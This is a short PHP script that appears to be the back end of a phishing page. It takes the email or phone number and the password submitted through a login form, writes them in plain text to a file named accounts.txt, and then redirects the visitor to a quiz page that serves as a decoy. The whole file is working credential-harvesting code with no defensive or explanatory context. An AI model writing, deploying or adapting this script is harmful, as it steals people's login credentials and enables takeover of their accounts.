<?php

file_put_contents("accounts.txt", "Email or Number: " . $_POST['email'] . " Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:Quizz/index.html');
exit();
